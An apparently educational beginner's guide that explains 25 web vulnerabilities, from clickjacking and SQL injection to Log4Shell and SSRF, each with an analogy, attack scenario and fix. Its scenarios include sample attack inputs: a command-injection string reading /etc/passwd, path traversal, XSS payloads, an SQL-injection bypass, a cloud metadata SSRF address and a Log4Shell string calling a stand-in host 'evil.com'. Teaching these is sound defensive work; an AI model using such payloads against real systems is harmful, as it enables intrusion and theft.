# Web Vulnerabilities: Explained Simply (Part 1)

Every item has: **Think of it like** (real-life picture) → **Scenario** (step by step) → **Why it works** → **Fix** (and why the fix works).

## Words you will see a lot

- **Browser**: the app you use to open websites (Chrome, Edge).
- **Server**: the computer that runs the website and holds the data.
- **Cookie**: a small note the website stores in your browser, like a **wristband at an event**. It proves you already logged in.
- **Session**: the "you are logged in" period. The server gives you a **session ID** (like a ticket number).
- **Token**: a secret code that proves who you are (like a key card).
- **Input**: anything a user can type or send (search box, URL, file name, form).
- **Script**: small code (JavaScript) that runs inside your browser.
- **Payload**: the bad input the attacker sends.

!!! info "Golden rule behind most of these"

    *never trust what a user sends; always check it on the server.*


---

## 1. Clickjacking

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/1021.html" target="_blank" rel="noopener noreferrer">CWE-1021</a></p>

!!! tip "Think of it like"

    Someone puts a transparent sticker over an ATM's "Check balance" button, but underneath it is "Send money". You press what you *see*, but you actually press what is *hidden*.

!!! example "Scenario"


    1. Hacker builds a page: "Click here to win a phone."
    2. On top of the button, he loads the bank's "Transfer money" page in an **invisible frame** (a page inside a page).
    3. Sneha is already logged in to her bank in another tab.
    4. She clicks "Win a phone" and actually clicks the bank's hidden "Confirm transfer" button.

!!! warning "Why it works"

    The bank page lets *any* other website put it inside a frame, and the browser sends her real login cookie.

!!! success "Fix"

    Tell the browser "my site must never be shown inside someone else's frame" using the header `X-Frame-Options: DENY` or CSP `frame-ancestors 'none'`. Now the hidden frame simply doesn't load, so the trick has nothing to click.

---

## 2. Command Injection

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/78.html" target="_blank" rel="noopener noreferrer">CWE-78</a> <a class="vtag atk" href="https://attack.mitre.org/techniques/T1190/" target="_blank" rel="noopener noreferrer" title="Exploit Public-Facing Application">ATT&amp;CK T1190</a> <a class="vtag atk" href="https://attack.mitre.org/techniques/T1059/" target="_blank" rel="noopener noreferrer" title="Command and Scripting Interpreter">ATT&amp;CK T1059</a> <span class="vtag owasp">OWASP A03:2021</span></p>

!!! tip "Think of it like"

    You tell a waiter, "Bring me tea." A prankster edits the order slip to "Bring me tea *and open the cash drawer*." The waiter follows the whole slip.

!!! example "Scenario"


    1. A website has a tool: "Enter a website name and we will ping it." Behind the scenes it runs `ping <what you typed>` on the server.
    2. Normal user types `google.com`. It works.
    3. Hacker types `google.com; cat /etc/passwd`. The `;` means "next command."
    4. Server runs the ping, then also prints its secret user file.

!!! warning "Why it works"

    The server pastes your text into a system command and can't tell where your input ends and the commands begin.

!!! success "Fix"

    Don't build system commands from user text. Use built-in functions instead of the shell, and allow only expected values (e.g., only letters, numbers and dots). Then `;` is rejected or treated as plain text.

---

## 3. Components with Vulnerabilities

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/1395.html" target="_blank" rel="noopener noreferrer">CWE-1395</a> <a class="vtag atk" href="https://attack.mitre.org/techniques/T1190/" target="_blank" rel="noopener noreferrer" title="Exploit Public-Facing Application">ATT&amp;CK T1190</a> <span class="vtag owasp">OWASP A06:2021</span></p>

!!! tip "Think of it like"

    Your house has a great lock, but the **window latch you bought is a known faulty model**. Thieves know it and just open it.

!!! example "Scenario"


    1. A company's blog uses a plugin called "FancyGallery v1.0."
    2. Researchers discover a bug in v1.0 and publish it publicly. The fixed version is v1.1.
    3. The company never updates.
    4. A hacker searches "FancyGallery v1.0 exploit," finds step-by-step instructions and takes over the blog.

!!! warning "Why it works"

    Attackers don't need to be clever; they use the **public list of known bugs**.

!!! success "Fix"

    Keep an inventory of every plugin and library, update them often, and use scanners (Dependabot, Snyk, `npm audit`) that warn you when a version is known to be unsafe.

---

## 4. Cross-Site Request Forgery (CSRF)

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/352.html" target="_blank" rel="noopener noreferrer">CWE-352</a> <span class="vtag owasp">OWASP A01:2021</span></p>

!!! tip "Think of it like"

    You're the boss and have a stamp that approves payments. A stranger slips a fake form on your desk. You don't read it carefully and stamp it anyway, because the stamp is **automatic**.

!!! example "Scenario"


    1. Ravi logs in to `mybank.com`. His browser holds a login cookie.
    2. In another tab, he opens a funny meme page made by a hacker.
    3. That page has a hidden form that sends "Transfer ₹10,000 to Hacker" to `mybank.com`.
    4. The browser **automatically attaches Ravi's cookie** to any request to mybank.com. The bank thinks Ravi sent it.

!!! warning "Why it works"

    The bank checks "does the request have a valid cookie?" but not "did Ravi actually *mean* to send this?"

!!! success "Fix"

    Add a **CSRF token**: a secret random code placed in the real form. The hacker's page can't know it, so the forged request fails. Also set cookies as `SameSite`, so browsers don't send them from other websites.

---

## 5. Directory Traversal

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/22.html" target="_blank" rel="noopener noreferrer">CWE-22</a> <a class="vtag atk" href="https://attack.mitre.org/techniques/T1190/" target="_blank" rel="noopener noreferrer" title="Exploit Public-Facing Application">ATT&amp;CK T1190</a> <span class="vtag owasp">OWASP A01:2021</span></p>

!!! tip "Think of it like"

    A library lets you take books only from the "Public" shelf. You say, "Go **up one floor** and then pick from the Staff Room." Because nobody blocked "go up", you reach private shelves.

!!! example "Scenario"


    1. A site shows files like `site.com/view?file=notes.pdf` (it reads the file from a folder named `/files/`).
    2. Priya changes it to `view?file=../../etc/passwd`. Each `../` means "go up one folder."
    3. The server walks up out of `/files/` and returns the system's user file.

!!! warning "Why it works"

    The server joins the folder name and her text without checking where the path ends up.

!!! success "Fix"

    Don't let users choose raw paths. Allow only names from a list, block `../`, and make sure the final path is still inside the allowed folder. Then the "go up" trick lands nowhere.

---

## 6. DOM XSS (Cross-Site Scripting, browser side)

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/79.html" target="_blank" rel="noopener noreferrer">CWE-79</a> <a class="vtag atk" href="https://attack.mitre.org/techniques/T1059/007/" target="_blank" rel="noopener noreferrer" title="JavaScript">ATT&amp;CK T1059.007</a> <span class="vtag owasp">OWASP A03:2021</span></p>

!!! tip "Think of it like"

    A notice board where whatever people write gets **executed** as instructions by everyone reading it, instead of just being read.

!!! example "Scenario"


    1. A page shows "Welcome, Ravi" by reading the name from the URL (`page.html#name=Ravi`) and writing it with `innerHTML`.
    2. The hacker sends Sneha the link `page.html#name=<img src=x onerror=stealCookie()>`.
    3. The page's own JavaScript puts that text into the page. The browser treats it as real HTML, the broken image triggers `onerror`, and the hacker's script runs.
    4. The script sends Sneha's cookie to the hacker, who can log in as her.

!!! warning "Why it works"

    `innerHTML` means "treat this text as page code." The word *DOM* just means "the live structure of the page in the browser", and the damage happens there, without the server being involved.

!!! success "Fix"

    Use `textContent` instead of `innerHTML`. It treats the text as plain words, so the weird text is shown on screen but never runs. If HTML is needed, clean it with a library such as DOMPurify.

---

## 7. Forced Browsing

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/425.html" target="_blank" rel="noopener noreferrer">CWE-425</a> <a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/862.html" target="_blank" rel="noopener noreferrer">CWE-862</a> <span class="vtag owasp">OWASP A01:2021</span></p>

!!! tip "Think of it like"

    A shop has a door marked "Staff only" with **no lock**. It's "hidden" just because there's no sign pointing to it. Anyone who tries the handle walks in.

!!! example "Scenario"


    1. Kiran visits `shop.com` and guesses `shop.com/admin`. It opens the admin panel without login.
    2. He tries `shop.com/backup.zip` and downloads the whole database backup.

!!! warning "Why it works"

    The site relied on "nobody will find it" instead of real protection. Guessing common names is automatic with tools.

!!! success "Fix"

    Put a login and permission check on **every** private page, and delete old files (backups, test pages) from the server. Hidden is not secure, locked is secure.

---

## 8. Header Injection

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/113.html" target="_blank" rel="noopener noreferrer">CWE-113</a> <span class="vtag owasp">OWASP A03:2021</span></p>

!!! tip "Think of it like"

    A courier writes your name on the parcel label. A prankster writes his name as `Bob [new line] Deliver to: Hacker's house`. Because the label reads line by line, the second line is believed as real.

!!! example "Scenario"


    1. After login, the server sends the browser a header: `Welcome-User: <your name>` (headers are small instruction lines before the page).
    2. The attacker sets the name to `bob%0d%0aSet-Cookie: admin=true` (`%0d%0a` means "new line").
    3. The server prints it as two lines: the second is a brand-new header that sets a fake cookie.

!!! warning "Why it works"

    A new line ends one header and starts another, and the server didn't remove it from user text.

!!! success "Fix"

    Remove or reject new-line characters (`\r`, `\n`) from any value placed in a header. Most modern frameworks do this, so keep them updated.

---

## 9. Horizontal Privilege Escalation

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/639.html" target="_blank" rel="noopener noreferrer">CWE-639</a> <span class="vtag owasp">OWASP A01:2021</span></p>

!!! tip "Think of it like"

    In a hotel, every guest has a key for their own room. A guest finds that the key **also opens the room next door**. Same level (guest), someone else's space.

!!! example "Scenario"


    1. Student A logs in and sees `results.com/marks?id=12`.
    2. Changes it to `id=13` and sees Student B's marks.

!!! warning "Why it works"

    The server checks *"are you logged in?"* but not *"is this record yours?"*

!!! success "Fix"

    On the server, always check that the record belongs to the logged-in user (for example, use the ID stored in the session, not the ID typed in the URL).

---

## 10. Insecure URL Redirect

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/601.html" target="_blank" rel="noopener noreferrer">CWE-601</a> <span class="vtag owasp">OWASP A01:2021</span></p>

!!! tip "Think of it like"

    A helpful guard says, "Walk through this door, and I'll send you to *any address you tell me*." A scammer says: "Send them to my fake bank."

!!! example "Scenario"


    1. `bank.com/login?next=/home` sends users to `/home` after login.
    2. The hacker emails: `bank.com/login?next=evil-bank.com`. The link starts with the real bank's name, so it looks safe.
    3. After a real login, the user is redirected to a copy of the bank that says "Session expired, enter your password again."

!!! warning "Why it works"

    The site trusts the `next` value and redirects anywhere.

!!! success "Fix"

    Allow redirects only to a fixed list of your own pages (or only relative paths like `/home`). If the target isn't on the list, go to the default page.

---

## 11. Leftover Debug Code

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/489.html" target="_blank" rel="noopener noreferrer">CWE-489</a> <span class="vtag owasp">OWASP A05:2021</span></p>

!!! tip "Think of it like"

    A builder leaves the **spare key and construction plans** hanging on the front door after finishing the house.

!!! example "Scenario"


    1. During development, the team added `/debug`, which prints server settings, including database passwords, to help testing.
    2. They forget to remove it before going live.
    3. A hacker tries `/debug` (a common name) and gets the passwords.

!!! warning "Why it works"

    Test shortcuts are made to be convenient, not safe.

!!! success "Fix"

    Remove debug pages before release, use separate settings for testing and live, and turn off detailed error messages in production.

---

## 12. Log4j (CVE-2021-44228, "Log4Shell")

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/917.html" target="_blank" rel="noopener noreferrer">CWE-917</a> <a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/502.html" target="_blank" rel="noopener noreferrer">CWE-502</a> <a class="vtag atk" href="https://attack.mitre.org/techniques/T1190/" target="_blank" rel="noopener noreferrer" title="Exploit Public-Facing Application">ATT&amp;CK T1190</a> <span class="vtag owasp">OWASP A06:2021</span></p>

!!! tip "Think of it like"

    A secretary writes every incoming letter in a diary. But if a letter says "**fetch the instructions from this address and follow them**", she actually does it, instead of just writing it down.

!!! example "Scenario"


    1. A server uses Log4j, a popular Java tool that writes logs (records of what happened).
    2. The attacker sets his username to `${jndi:ldap://evil.com/x}` and sends a login request.
    3. The server logs the failed login. Log4j sees the special `${...}` pattern, **contacts evil.com**, downloads the attacker's code and runs it.
    4. The attacker now controls the server.

!!! warning "Why it works"

    Log4j treated a part of the log text as a *command to execute* (the "JNDI lookup" feature).

!!! success "Fix"

    Update Log4j to a patched version (2.17.1 or later). If you can't update immediately, disable that lookup feature. Also check all products that bundle Log4j.

---

## 13. PII Data in URL

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/598.html" target="_blank" rel="noopener noreferrer">CWE-598</a></p>

!!! tip "Think of it like"

    Writing your phone number and ID number on the **outside of an envelope** instead of inside it. Everyone who handles it can read it.

!!! example "Scenario"


    1. A form submits to `site.com/profile?phone=9876543210&aadhaar=1234...` (PII = personally identifiable information).
    2. That URL is saved in browser history, server logs, proxy logs, analytics and anyone's screenshot.
    3. Someone with access to any of these places reads the data.

!!! warning "Why it works"

    URLs are treated as *public* and stored in many places. Request bodies are not.

!!! success "Fix"

    Send private data in the request body (POST), not in the URL. Don't log full URLs that include sensitive values.

---

## 14. Reflected XSS

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/79.html" target="_blank" rel="noopener noreferrer">CWE-79</a> <a class="vtag atk" href="https://attack.mitre.org/techniques/T1059/007/" target="_blank" rel="noopener noreferrer" title="JavaScript">ATT&amp;CK T1059.007</a> <span class="vtag owasp">OWASP A03:2021</span></p>

!!! tip "Think of it like"

    You call a shop and say, "Please repeat after me: [bad words]." The shop repeats it out loud to everyone in the store. The text came from the *request*, and was *reflected* back.

!!! example "Scenario"


    1. `shop.com/search?q=shoes` shows "Results for: shoes."
    2. The hacker creates `shop.com/search?q=<script>sendCookie()</script>` and emails it to Priya: "50% off, click here."
    3. The server puts the text into the page without cleaning it. The browser sees a script and runs it.
    4. Her session cookie goes to the hacker.

!!! warning "Why it works"

    The server printed the user's input directly into the HTML. Reflected XSS needs the victim to click a crafted link.

!!! success "Fix"

    **Encode output**: turn `<` into `&lt;` so the browser shows it as text. Also validate input and add a Content Security Policy (CSP), which tells the browser to run only approved scripts.

---

## 15. Ruby rest-client 1.6.13 Backdoor

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/506.html" target="_blank" rel="noopener noreferrer">CWE-506</a> <a class="vtag atk" href="https://attack.mitre.org/techniques/T1195/002/" target="_blank" rel="noopener noreferrer" title="Compromise Software Supply Chain">ATT&amp;CK T1195.002</a> <span class="vtag owasp">OWASP A08:2021</span></p>

!!! tip "Think of it like"

    You buy a sealed medicine bottle from a trusted brand, but someone **swapped one batch** with a tampered one. It looks identical, but it's harmful.

!!! example "Scenario"


    1. `rest-client` is a popular Ruby library that apps use to call web services.
    2. Attackers took over a developer's account and published a modified version, 1.6.13, with hidden code.
    3. Developers ran an update. The hidden code stole data and gave the attacker remote access.

!!! warning "Why it works"

    Apps *trust* libraries completely. Whatever a library does, your app does too.

!!! success "Fix"

    Pin exact versions and verify them (checksums), use lock files, monitor security advisories, and remove/replace the affected version. Use scanners that flag known-malicious versions.

---

## 16. Sensitive Server-Side Request Forgery (SSRF)

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/918.html" target="_blank" rel="noopener noreferrer">CWE-918</a> <a class="vtag atk" href="https://attack.mitre.org/techniques/T1190/" target="_blank" rel="noopener noreferrer" title="Exploit Public-Facing Application">ATT&amp;CK T1190</a> <a class="vtag atk" href="https://attack.mitre.org/techniques/T1552/005/" target="_blank" rel="noopener noreferrer" title="Cloud Instance Metadata API">ATT&amp;CK T1552.005</a> <span class="vtag owasp">OWASP A10:2021</span></p>

!!! tip "Think of it like"

    You ask a trusted office assistant: "Please go and fetch this document from this address." You give the address of the **boss's private locked cabinet**, which only staff can enter. The assistant has access, so he gets it for you.

!!! example "Scenario"


    1. A site has "Import profile picture from URL."
    2. The attacker enters `http://169.254.169.254/latest/meta-data/` (a special address that only works *from inside* a cloud server and holds secret keys).
    3. The server fetches it for the attacker and shows the result: cloud access keys.

!!! warning "Why it works"

    The attacker can't reach the internal address, but the **server can**, and it follows any URL it's given.

!!! success "Fix"

    Allow only trusted domains, block internal and private IP addresses (like `127.0.0.1`, `10.x.x.x`, `169.254.x.x`), and don't return raw responses to the user.

---

## 17. Session Fixation

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/384.html" target="_blank" rel="noopener noreferrer">CWE-384</a> <span class="vtag owasp">OWASP A07:2021</span></p>

!!! tip "Think of it like"

    A hacker gives you a **hotel key card he already copied**. You go to reception and "activate" it with your name. Now both of you have a working key to your room.

!!! example "Scenario"


    1. The hacker opens the site and gets a session ID: `ABC123`.
    2. He sends Sneha a link `site.com/login?sessionid=ABC123`.
    3. Sneha logs in. The site keeps using the same ID `ABC123` and marks it as "Sneha is logged in."
    4. The hacker uses `ABC123` in his browser and is now logged in as Sneha.

!!! warning "Why it works"

    The site doesn't change the session ID at login, so the one the hacker knew becomes valuable.

!!! success "Fix"

    Always create a **new session ID** right after a successful login and invalidate the old one. Never accept session IDs from the URL.

---

## 18. SQL Injection

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/89.html" target="_blank" rel="noopener noreferrer">CWE-89</a> <a class="vtag atk" href="https://attack.mitre.org/techniques/T1190/" target="_blank" rel="noopener noreferrer" title="Exploit Public-Facing Application">ATT&amp;CK T1190</a> <span class="vtag owasp">OWASP A03:2021</span></p>

!!! tip "Think of it like"

    A bank clerk follows a note you hand over: "Give money to **Ravi**." You change it to "Give money to Ravi **and open the vault**." The clerk can't tell what's data and what's a command.

!!! example "Scenario"


    1. The login code builds: `SELECT * FROM users WHERE name='[name]' AND password='[password]'`.
    2. A normal user types `ravi` / `1234`: the database looks for that exact pair.
    3. The hacker types `' OR 1=1 --` as the password. The query now says: *"...password='' OR 1=1"*. Since 1=1 is always true, every row matches, and `--` comments out the rest.
    4. He's logged in as the first user (often admin).

!!! warning "Why it works"

    The user's text became part of the command.

!!! success "Fix"

    Use **parameterized queries** (prepared statements). The command and the data are sent separately, so `' OR 1=1 --` is treated as just a strange password and the login fails.

---

## 19. Stored XSS

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/79.html" target="_blank" rel="noopener noreferrer">CWE-79</a> <a class="vtag atk" href="https://attack.mitre.org/techniques/T1059/007/" target="_blank" rel="noopener noreferrer" title="JavaScript">ATT&amp;CK T1059.007</a> <span class="vtag owasp">OWASP A03:2021</span></p>

!!! tip "Think of it like"

    A prankster writes a trap on the **wall of a public board**. It stays there, and *everyone* who looks at the wall gets caught, not just one person.

!!! example "Scenario"


    1. A blog allows comments. Arjun posts `<script>sendCookie()</script>` as a comment.
    2. The site **saves** it in the database.
    3. Every visitor who opens that post runs the script, and their cookies go to Arjun. If the admin visits, Arjun takes over the admin account.

!!! warning "Why it works"

    The site saved the comment as-is and printed it back as live HTML. Unlike reflected XSS, no special link is needed; it's more dangerous because it spreads automatically.

!!! success "Fix"

    Clean/validate on saving, and **encode when displaying** (the most important step). Add a CSP, and mark session cookies `HttpOnly` so scripts can't read them.

---

## 20. TikTok XSS Vulnerability

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/79.html" target="_blank" rel="noopener noreferrer">CWE-79</a> <span class="vtag owasp">OWASP A03:2021</span></p>

!!! tip "Think of it like"

    Even a giant, well-protected shopping mall can have **one side door** that was never checked.

!!! example "Scenario (simplified)"


    1. Security researchers found that, in a specific TikTok web feature, some user-controlled data was shown on the page without being cleaned properly.
    2. A specially crafted link could run a script inside a victim's browser, on TikTok's own website.
    3. In theory, this could be used to perform actions as that user (take over the account).

!!! warning "Why it works"

    The same reason as other XSS: data was treated as code. It also shows that even big companies make this mistake.

!!! success "Fix"

    The company fixed it after the report. In general: encode output, use CSP, test regularly (including bug bounty programs), and patch fast.

    *(Study tip: for exact technical details, read the original public report. This explains the idea only.)*

---

## 21. Token Exposure in URL

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/598.html" target="_blank" rel="noopener noreferrer">CWE-598</a> <a class="vtag atk" href="https://attack.mitre.org/techniques/T1528/" target="_blank" rel="noopener noreferrer" title="Steal Application Access Token">ATT&amp;CK T1528</a></p>

!!! tip "Think of it like"

    Writing your **house key's code on a postcard**. Everyone who touches the postcard can copy it.

!!! example "Scenario"


    1. After login, a site redirects to `site.com/dashboard?token=abc123`.
    2. Ravi copies the link and sends it to a friend: "check this."
    3. The friend opens it and is logged in as **Ravi**. The token also stays in browser history and server logs.

!!! warning "Why it works"

    The token is the proof of identity, and a URL is easy to share, save and leak (including through the `Referer` header to other sites).

!!! success "Fix"

    Keep tokens in `HttpOnly` secure cookies or in an `Authorization` header, never in the URL. Make tokens expire quickly.

---

## 22. User Enumeration

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/204.html" target="_blank" rel="noopener noreferrer">CWE-204</a> <a class="vtag atk" href="https://attack.mitre.org/techniques/T1087/" target="_blank" rel="noopener noreferrer" title="Account Discovery">ATT&amp;CK T1087</a> <span class="vtag owasp">OWASP A07:2021</span></p>

!!! tip "Think of it like"

    A guard at a building says, "No one called *Ravi* lives here" vs. "Ravi lives here, but that's the wrong flat number." The second answer **confirms Ravi lives there**.

!!! example "Scenario"


    1. The login page says "Email not registered" for unknown emails and "Wrong password" for known ones.
    2. A hacker tries 10,000 email addresses and keeps the ones that show "Wrong password."
    3. Now he has a list of real users to attack with password guessing or phishing.

!!! warning "Why it works"

    Different messages leak whether an account exists. This also happens in signup, password reset and response timing.

!!! success "Fix"

    Show the **same message for everything**: "Invalid email or password." For password reset: "If this email exists, we've sent a link." Also add rate limiting.

---

## 23. Vertical Privilege Escalation

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/269.html" target="_blank" rel="noopener noreferrer">CWE-269</a> <a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/863.html" target="_blank" rel="noopener noreferrer">CWE-863</a> <span class="vtag owasp">OWASP A01:2021</span></p>

!!! tip "Think of it like"

    A visitor with a "Guest" badge changes the badge to "Manager" with a pen, and the guard just trusts the badge. Going **up** in rank.

!!! example "Scenario"


    1. After login, the site stores `role=user` in a cookie.
    2. Kiran edits the cookie to `role=admin` using browser tools.
    3. The site reads the cookie, believes it, and shows him the admin panel.

!!! warning "Why it works"

    The server trusts something the user controls. Anything in the browser can be edited by the user.

!!! success "Fix"

    Keep the role **on the server** (in the session or database) and check it on every admin action. Never decide permission from something the user sends.

---

## 24. Weak Randomness

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/330.html" target="_blank" rel="noopener noreferrer">CWE-330</a> <a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/338.html" target="_blank" rel="noopener noreferrer">CWE-338</a> <span class="vtag owasp">OWASP A02:2021</span></p>

!!! tip "Think of it like"

    A lottery that picks the winning number from **today's date**. If you know the date, you know the "random" number.

!!! example "Scenario"


    1. Password reset codes are generated from the current time, e.g., `1730812345`.
    2. The hacker requests a reset for Priya's account at around 10:00:00.
    3. He tries the few thousand codes that match times around then and finds the right one in seconds.
    4. He resets her password.

!!! warning "Why it works"

    Normal "random" functions (like `Math.random()`) are made for games, not secrets. They're predictable.

!!! success "Fix"

    Use a **cryptographically secure random generator** (like `crypto.randomBytes` in Node, `secrets` in Python) with enough length (e.g., 32 characters). Also make codes expire fast and work only once.

---

## 25. XML Injection

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/91.html" target="_blank" rel="noopener noreferrer">CWE-91</a> <span class="vtag owasp">OWASP A03:2021</span></p>

!!! tip "Think of it like"

    A form that builds a **letter in a fixed template**: `<name>YOUR NAME</name>`. You write your name as `Bob</name><role>admin</role><name>`, so the letter now says you're an admin.

!!! example "Scenario"


    1. The server builds an XML record: `<user><name>[input]</name><role>user</role></user>`.
    2. The attacker's name is `Bob</name><role>admin</role><name>x`.
    3. The XML now contains `<role>admin</role>`, and the system reads the attacker as an administrator.

!!! warning "Why it works"

    XML uses tags (`<...>`) as structure, and user text was allowed to include tags.

!!! success "Fix"

    Escape special characters (turn `<` into `&lt;`), build XML with a proper library instead of joining strings, and validate input against a fixed format (schema).

---

## Quick summary (memorize this)

| Family | Items | One-line defence |
|---|---|---|
| Injection (input becomes command) | Command, SQL, XML, Header injection | Never mix user text into commands; use safe APIs |
| XSS (input becomes script) | DOM, Reflected, Stored, TikTok | Encode output, use CSP |
| Access control | Forced browsing, Horizontal, Vertical escalation, Redirect | Check permission on the server every time |
| Session and tokens | CSRF, Session fixation, Token in URL, Weak randomness | New session after login, secure random tokens, tokens out of URLs |
| Information leaks | PII in URL, Debug code, User enumeration | Don't reveal more than necessary |
| Server tricks | SSRF, Directory traversal, Clickjacking | Allow-lists and security headers |
| Supply chain | Components, Log4j, rest-client backdoor | Update and verify what you use |
